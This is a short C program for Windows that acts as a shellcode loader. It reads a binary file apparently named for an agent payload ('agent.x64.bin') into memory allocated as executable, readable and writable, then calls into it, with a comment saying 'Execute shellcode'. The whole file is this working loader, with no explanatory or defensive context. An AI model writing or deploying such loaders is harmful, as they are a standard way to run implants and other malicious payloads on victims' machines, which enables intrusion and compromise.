#include <windows.h>
#include <stdio.h>

int main() {
    FILE *f = fopen("agent.x64.bin", "rb");
    fseek(f, 0, SEEK_END);
    size_t len = ftell(f);
    rewind(f);

    unsigned char *sc = (unsigned char*)VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    fread(sc, 1, len, f);
    fclose(f);

    ((void(*)())sc)(); // Execute shellcode
    return 0;
}
